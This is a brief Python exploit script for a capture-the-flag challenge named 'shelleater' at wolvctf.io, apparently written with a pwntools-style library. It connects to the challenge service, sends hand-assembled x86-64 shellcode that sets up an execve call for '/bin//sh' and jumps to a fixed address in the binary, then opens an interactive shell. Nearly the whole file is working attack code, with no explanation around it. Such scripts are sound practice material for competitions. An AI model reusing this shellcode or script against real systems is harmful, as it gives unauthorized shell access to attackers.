#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from rootkit.exploit import *
from time import sleep

exe = context.binary = ELF("./shelleater")
host = (
    args.HOST
    or "shelleater.wolvctf.io"
)
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
# libc = ELF("./libc.so.6")

io = start()
re()

payload = asm("""
    xor rsi,rsi
    push rsi
    mov rdi,0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    push 59
    pop rax
    cdq
    push 0x00000000401000
    pop rcx
    add rcx, 0x19
    jmp rcx

""")

sl(payload)

io.interactive()
# 5 65 73 49